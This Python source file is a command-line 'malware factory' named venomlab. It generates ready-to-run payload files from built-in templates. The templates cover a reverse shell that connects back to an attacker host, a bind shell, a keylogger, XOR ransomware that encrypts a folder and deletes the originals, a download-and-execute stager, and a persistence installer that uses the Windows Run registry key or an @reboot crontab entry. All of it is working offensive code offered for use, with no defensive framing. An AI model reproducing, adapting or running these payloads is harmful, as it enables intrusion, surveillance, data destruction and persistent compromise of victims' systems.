#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
venomlab v1.0.0
================
A tiny, dependency-free CLI toolkit that generates ready-to-run Python payloads.

Commands:
    help [command]        Show general help or help for a specific command
    list                  List every available payload type
    info <type>           Show a payload's description and parameters
    create <type>         Generate a payload file
    version               Show the version banner

Examples:
    python venomlab.py list
    python venomlab.py info reverse_shell
    python venomlab.py create reverse_shell -s HOST=10.0.0.5 -s PORT=9001 -o shell.py
    python venomlab.py create ransomware -s TARGET=/home/me/docs -s KEY=77
"""

import argparse
import os
import re
import sys
from datetime import datetime

VERSION = "1.0.0"

BANNER = r"""
 __     __ _____ _   _  ___  __  __ _        _    ____
 \ \   / /| ____| \ | |/ _ \|  \/  | |      / \  | __ )
  \ \ / / |  _| |  \| | | | | |\/| | |     / _ \ |  _ \
   \ V /  | |___| |\  | |_| | |  | | |___ / ___ \| |_) |
    \_/   |_____|_| \_|\___/|_|  |_|_____/_/   \_\____/
                venomlab v{ver}  ::  python malware factory
"""


# --------------------------------------------------------------------------- #
#  Helpers
# --------------------------------------------------------------------------- #
def die(msg, code=1):
    sys.stderr.write("venomlab: error: %s\n" % msg)
    sys.exit(code)


def render(template, values):
    """Replace {{TOKEN}} placeholders using values dict."""
    def sub(match):
        key = match.group(1)
        if key not in values:
            raise KeyError(key)
        return str(values[key])
    return re.sub(r"\{\{(\w+)\}\}", sub, template)


def coerce(value):
    """Turn a string into int/bool/str so generated code stays typed."""
    low = value.lower()
    if low in ("true", "false"):
        return low == "true"
    try:
        return int(value)
    except ValueError:
        return value


# --------------------------------------------------------------------------- #
#  Payload templates
# --------------------------------------------------------------------------- #
REVERSE_SHELL = r'''#!/usr/bin/env python3
"""venomlab :: reverse shell payload
Connects back to HOST:PORT and hands the attacker a remote shell."""
import socket
import subprocess
import sys
import time

HOST = "{{HOST}}"
PORT = {{PORT}}
RECONNECT = {{RECONNECT}}


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s


def serve(s):
    s.sendall(b"[venomlab] shell ready\n")
    while True:
        data = s.recv(4096)
        if not data:
            return
        cmd = data.decode(errors="ignore").strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            s.sendall(b"bye\n")
            return
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            out = e.output or b""
        except Exception as e:
            out = ("error: %s\n" % e).encode()
        s.sendall(out if out else b"(no output)\n")


def main():
    while True:
        try:
            s = connect()
            serve(s)
            s.close()
        except Exception as e:
            sys.stderr.write("connection failed: %s\n" % e)
        if not RECONNECT:
            break
        time.sleep(3)


if __name__ == "__main__":
    main()
'''

BIND_SHELL = r'''#!/usr/bin/env python3
"""venomlab :: bind shell payload
Listens on 0.0.0.0:PORT and serves a shell to the first client."""
import socket
import subprocess

PORT = {{PORT}}
BACKLOG = {{BACKLOG}}


def handle(conn, addr):
    print("[venomlab] client connected: %s" % (addr,))
    conn.sendall(b"[venomlab] shell ready\n")
    while True:
        data = conn.recv(4096)
        if not data:
            break
        cmd = data.decode(errors="ignore").strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            out = e.output or b""
        conn.sendall(out if out else b"(no output)\n")
    conn.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(BACKLOG)
    print("[venomlab] listening on 0.0.0.0:%d" % PORT)
    while True:
        conn, addr = srv.accept()
        handle(conn, addr)


if __name__ == "__main__":
    main()
'''

KEYLOGGER = r'''#!/usr/bin/env python3
"""venomlab :: keylogger payload  (requires: pip install pynput)"""
import sys
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    sys.exit("pynput is required -> pip install pynput")

LOGFILE = "{{LOGFILE}}"


def stamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def on_press(key):
    try:
        ch = key.char
    except AttributeError:
        ch = " [%s] " % key.name
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(ch)
    print(ch, end="", flush=True)


def main():
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write("\n--- session %s ---\n" % stamp())
    print("[venomlab] logging keystrokes -> %s  (Ctrl+C to stop)" % LOGFILE)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
'''

RANSOMWARE = r'''#!/usr/bin/env python3
"""venomlab :: XOR 'ransomware' payload
Encrypts every file under TARGET, appends EXT, drops a key file.
Run it a second time to decrypt everything."""
import os
import sys

TARGET = "{{TARGET}}"
EXT = "{{EXT}}"
KEY = {{KEY}}


def xor(data, key):
    return bytes(b ^ key for b in data)


def walk(target):
    for root, _dirs, files in os.walk(target):
        for name in files:
            yield os.path.join(root, name)


def main():
    if not os.path.isdir(TARGET):
        sys.exit("target dir not found: %s" % TARGET)

    keyfile = os.path.join(TARGET, "venom.key")
    if os.path.exists(keyfile):
        with open(keyfile, "r") as f:
            key = int(f.read().strip())
        decrypting = True
    else:
        key = KEY
        decrypting = False

    count = 0
    for path in list(walk(TARGET)):
        if decrypting:
            if not path.endswith(EXT):
                continue
            with open(path, "rb") as f:
                data = xor(f.read(), key)
            out = path[: -len(EXT)]
        else:
            if path.endswith(EXT) or path.endswith(".key"):
                continue
            with open(path, "rb") as f:
                data = xor(f.read(), key)
            out = path + EXT

        with open(out, "wb") as f:
            f.write(data)
        os.remove(path)
        count += 1

    if decrypting:
        os.remove(keyfile)
        print("[venomlab] decrypted %d files" % count)
    else:
        with open(keyfile, "w") as f:
            f.write(str(key))
        print("[venomlab] encrypted %d files (key=%d) -> %s" % (count, key, EXT))


if __name__ == "__main__":
    main()
'''

DOWNLOADER = r'''#!/usr/bin/env python3
"""venomlab :: download-and-execute stager"""
import os
import subprocess
import tempfile
import urllib.request

URL = "{{URL}}"
FILENAME = "{{FILENAME}}"
INTERPRETER = "{{INTERPRETER}}"


def main():
    dest = os.path.join(tempfile.gettempdir(), FILENAME)
    print("[venomlab] fetching %s" % URL)
    with urllib.request.urlopen(URL) as resp, open(dest, "wb") as f:
        f.write(resp.read())
    print("[venomlab] saved -> %s" % dest)

    cmd = [INTERPRETER, dest] if INTERPRETER else [dest]
    subprocess.Popen(cmd)
    print("[venomlab] launched: %s" % " ".join(cmd))


if __name__ == "__main__":
    main()
'''

PERSISTENCE = r'''#!/usr/bin/env python3
"""venomlab :: persistence installer
Auto-runs PAYLOAD on login via the Windows Run key or a Linux @reboot cron job."""
import os
import subprocess
import sys

PAYLOAD = r"{{PAYLOAD}}"
NAME = "{{NAME}}"


def install_windows():
    import winreg
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE,
    )
    winreg.SetValueEx(key, NAME, 0, winreg.REG_SZ, PAYLOAD)
    winreg.CloseKey(key)
    print("[venomlab] installed registry Run entry: %s" % NAME)


def install_linux():
    line = "@reboot %s" % PAYLOAD
    try:
        current = subprocess.check_output(["crontab", "-l"]).decode()
    except subprocess.CalledProcessError:
        current = ""
    if line in current:
        print("[venomlab] crontab entry already present")
        return
    proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
    proc.communicate((current + line + "\n").encode())
    print("[venomlab] installed crontab @reboot entry")


def main():
    if os.name == "nt":
        install_windows()
    else:
        install_linux()


if __name__ == "__main__":
    main()
'''


PAYLOADS = {
    "reverse_shell": {
        "desc": "Connect back to an attacker host and serve a remote shell.",
        "template": REVERSE_SHELL,
        "params": [
            {"name": "HOST", "default": "127.0.0.1", "help": "Attacker IP / hostname"},
            {"name": "PORT", "default": 4444, "help": "Attacker TCP port"},
            {"name": "RECONNECT", "default": True, "help": "Auto-reconnect on drop (true/false)"},
        ],
    },
    "bind_shell": {
        "desc": "Listen on a port and serve a shell to the first client.",
        "template": BIND_SHELL,
        "params": [
            {"name": "PORT", "default": 4444, "help": "Local listening port"},
            {"name": "BACKLOG", "default": 5, "help": "Socket listen backlog"},
        ],
    },
    "keylogger": {
        "desc": "Capture keystrokes to a log file (needs pynput).",
        "template": KEYLOGGER,
        "params": [
            {"name": "LOGFILE", "default": "keys.log", "help": "Path to the keystroke log"},
        ],
    },
    "ransomware": {
        "desc": "XOR-encrypt a folder; run twice to decrypt.",
        "template": RANSOMWARE,
        "params": [
            {"name": "TARGET", "default": ".", "help": "Folder to encrypt/decrypt"},
            {"name": "EXT", "default": ".venom", "help": "Appended to encrypted files"},
            {"name": "KEY", "default": 42, "help": "XOR key (0-255)"},
        ],
    },
    "downloader": {
        "desc": "Download a remote file and execute it.",
        "template": DOWNLOADER,
        "params": [
            {"name": "URL", "default": "http://example.com/payload.py", "help": "Remote file URL"},
            {"name": "FILENAME", "default": "payload.py", "help": "Local temp filename"},
            {"name": "INTERPRETER", "default": "python", "help": "Interpreter to launch it with (blank = direct exec)"},
        ],
    },
    "persistence": {
        "desc": "Register a payload to auto-run on login (Windows Run key / Linux crontab).",
        "template": PERSISTENCE,
        "params": [
            {"name": "PAYLOAD", "default": "python /path/to/payload.py", "help": "Command to run at login"},
            {"name": "NAME", "default": "venomlab", "help": "Entry name"},
        ],
    },
}


# --------------------------------------------------------------------------- #
#  Commands
# --------------------------------------------------------------------------- #
def cmd_help(args):
    topic = getattr(args, "topic", None)
    print(BANNER.format(ver=VERSION))
    if topic and topic in ("create", "info", "list"):
        if topic == "create":
            print("create <type> [--out FILE] [--set KEY=VALUE ...]")
            print("  Generate a payload file. Repeat --set to override parameters.")
            print("  Example: venomlab create reverse_shell -s HOST=10.0.0.5 -s PORT=9001")
        elif topic == "info":
            print("info <type>")
            print("  Show a payload's description and its parameters.")
        elif topic == "list":
            print("list")
            print("  Show every available payload type.")
        return

    print("usage: venomlab <command> [options]\n")
    print("commands:")
    print("  help [command]     show help (optionally for one command)")
    print("  list               list all payload types")
    print("  info <type>        describe a payload and its parameters")
    print("  create <type>      generate a payload file")
    print("  version            show version\n")
    print("run 'venomlab list' to see payload types, or 'venomlab info <type>' for details.")


def cmd_version(_args):
    print(BANNER.format(ver=VERSION))


def cmd_list(_args):
    print("available payload types:\n")
    for name, spec in sorted(PAYLOADS.items()):
        print("  %-14s %s" % (name, spec["desc"]))
    print("\nrun 'venomlab info <type>' for parameters.")


def cmd_info(args):
    name = args.type
    if name not in PAYLOADS:
        die("unknown payload type: %s (try 'venomlab list')" % name)
    spec = PAYLOADS[name]
    print("payload: %s" % name)
    print("about  : %s" % spec["desc"])
    print("params :")
    for p in spec["params"]:
        print("  %-14s default=%-22s %s" % (p["name"], repr(p["default"]), p["help"]))


def cmd_create(args):
    name = args.type
    if name not in PAYLOADS:
        die("unknown payload type: %s (try 'venomlab list')" % name)

    spec = PAYLOADS[name]
    values = {p["name"]: p["default"] for p in spec["params"]}

    for item in args.set or []:
        if "=" not in item:
            die("bad --set (expected KEY=VALUE): %s" % item)
        k, v = item.split("=", 1)
        values[k.upper()] = coerce(v)

    try:
        code = render(spec["template"], values)
    except KeyError as e:
        die("missing value for parameter: %s" % e)

    out = args.out or "%s_%s.py" % (name, datetime.now().strftime("%Y%m%d_%H%M%S"))
    with open(out, "w", encoding="utf-8") as f:
        f.write(code)
    os.chmod(out, 0o755)

    print("[venomlab] forged '%s' -> %s" % (name, os.path.abspath(out)))
    for p in spec["params"]:
        print("           %-14s = %r" % (p["name"], values[p["name"]]))


# --------------------------------------------------------------------------- #
#  Entry point
# --------------------------------------------------------------------------- #
def build_parser():
    p = argparse.ArgumentParser(prog="venomlab", description="python malware factory")
    sub = p.add_subparsers(dest="command")

    h = sub.add_parser("help")
    h.add_argument("topic", nargs="?", help="command to get help for")
    h.set_defaults(func=cmd_help)

    sub.add_parser("version").set_defaults(func=cmd_version)
    sub.add_parser("list").set_defaults(func=cmd_list)

    i = sub.add_parser("info")
    i.add_argument("type")
    i.set_defaults(func=cmd_info)

    c = sub.add_parser("create")
    c.add_argument("type")
    c.add_argument("--out", "-o", help="output file")
    c.add_argument("--set", "-s", action="append", metavar="KEY=VALUE",
                   help="override a parameter (repeatable)")
    c.set_defaults(func=cmd_create)

    return p


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "command", None):
        cmd_help(args)
        return
    args.func(args)


if __name__ == "__main__":
    main()
